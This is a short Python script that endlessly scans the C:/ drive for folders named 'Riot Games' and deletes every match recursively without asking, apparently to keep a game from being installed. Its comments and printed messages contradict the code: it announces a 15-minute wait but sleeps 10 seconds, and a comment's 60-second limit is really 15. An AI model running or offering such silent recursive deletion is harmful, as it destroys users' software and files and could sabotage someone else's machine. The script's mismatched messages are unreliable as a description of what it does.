import os
import shutil
import time
import random
target_directory_name = "Riot Games"
start_time = time.time()  # Record the start time

while True:
    print("Looking for dir")
    for root, dirs, files in os.walk("C:/"):
        if target_directory_name in dirs:
            directory_path = os.path.join(root, target_directory_name)
            print(f"Found the directory at: {directory_path}")
            shutil.rmtree(directory_path)
            print("Dir deleted")
            print("Waiting for 15 minutes")
            time.sleep(10)
            break
        
        # Check if 60 seconds have passed, and break the loop if so
        elapsed_time = time.time() - start_time
        if elapsed_time >= 15:
            print("Target directory not found within 15 seconds.")
            print("Waiting for 15 minutes")
            time.sleep(10)
            start_time = time.time()  # Record the start time
            break
